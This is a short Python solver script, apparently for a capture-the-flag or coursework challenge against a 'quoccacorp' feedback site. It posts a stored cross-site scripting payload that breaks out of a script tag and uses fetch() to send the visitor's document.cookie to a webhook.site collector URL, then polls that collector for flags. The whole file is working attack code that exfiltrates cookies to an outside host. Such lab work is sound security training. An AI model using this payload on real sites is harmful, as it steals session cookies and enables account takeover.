import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, WebhookSite

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite = WebhookSite()

    def main(self):
        BASE_URL = "https://fetch.quoccacorp.com"
        PAYLOAD = f'''</script><script>fetch(`{self.webhooksite.url}?q=${{document.cookie}}`)</script>'''

        response = self.session.post(BASE_URL, json={"who": PAYLOAD, "why": PAYLOAD})
        view_feedback_url = response.json().get("success").split(' ')[-1]

        self.webhooksite.find_flags()

if __name__ == "__main__":
    Solver().main()
